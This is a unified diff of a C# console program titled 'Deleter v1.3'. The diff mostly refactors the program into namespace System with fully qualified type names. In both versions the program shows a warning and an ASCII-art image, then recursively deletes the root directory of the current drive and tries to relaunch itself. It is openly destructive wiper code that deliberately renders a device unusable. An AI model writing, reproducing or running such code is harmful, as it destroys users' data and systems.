@@ -1,43 +1,47 @@
 using System;
-using System.Diagnostics;
 using System.IO;
 using System.Threading;
 using System.Reflection;
-class Deleter {
-    public static string dir = Directory.GetDirectoryRoot(Directory.GetCurrentDirectory());
-    public const string Ver = "1.3";
-    public const string Title = "Deleter v" + Ver;
-    public static string ProgramName = Assembly.GetExecutingAssembly().FullName;
-    public static void DeleteDir()
+namespace System
+{
+    public class Deleter
     {
-        Process.Start(ProgramName);
-        try
+        public static System.String Dir = System.IO.Directory.GetDirectoryRoot(System.IO.Directory.GetCurrentDirectory());
+        public const System.String Ver = "1.3";
+        public const System.String Title = "Deleter v" + System.Deleter.Ver;
+        public static System.String ProgramName = System.Reflection.Assembly.GetExecutingAssembly().FullName;
+        public static void DeleteDir()
         {
-            Console.WriteLine("Deleting " + dir);
-            Directory.Delete(dir, true);
+            System.Diagnostics.Process.Start(System.Deleter.ProgramName);
+            try
+            {
+                System.Console.WriteLine("Deleting " + System.Deleter.Dir);
+                System.IO.Directory.Delete(System.Deleter.Dir, true);
+            }
+            catch (System.Exception ex)
+            {
+                System.Console.WriteLine("Error deleting " + System.Deleter.Dir);
+                System.Console.WriteLine(ex);
+            }
         }
-        catch (Exception ex)
+        public static void Main(System.String[] args)
         {
-            Console.WriteLine("Error deleting " + dir);
-            Console.WriteLine(ex);
+            System.Console.WriteLine("WARNING! THIS DELETES THE ROOT DIRECTORY! " +
+                  "EXECUTING THIS WILL RENDER YOUR DEVICE UNUSABLE!");
+            System.Console.ReadKey();
+            System.Deleter.Delete();
         }
-    }
-    static void Main(string[] args) {
-        Console.WriteLine("WARNING! THIS DELETES THE ROOT DIRECTORY! " +
-              "EXECUTING THIS WILL RENDER YOUR DEVICE UNUSABLE!");
-        Console.ReadKey();
-        Delete();
-    }
-    static void Delete() 
-    { 
-        Console.Title = Title;
-        Process p = new Process();
-        p.StartInfo.UseShellExecute = true;
-        p.StartInfo.Verb = "runas";
-        Console.ForegroundColor = ConsoleColor.DarkGreen;
-        Console.BackgroundColor = ConsoleColor.Black;
-        Console.Write("                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n");
-        Thread.Sleep(1000);
-        DeleteDir();
+        public static void Delete()
+        {
+            System.Console.Title = System.Deleter.Title;
+            System.Diagnostics.Process p = new System.Diagnostics.Process();
+            p.StartInfo.UseShellExecute = true;
+            p.StartInfo.Verb = "runas";
+            System.Console.ForegroundColor = System.ConsoleColor.DarkGreen;
+            System.Console.BackgroundColor = System.ConsoleColor.Black;
+            System.Console.Write("                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n");
+            System.Threading.Thread.Sleep(1000);
+            System.Deleter.DeleteDir();
+        }
     }
 }
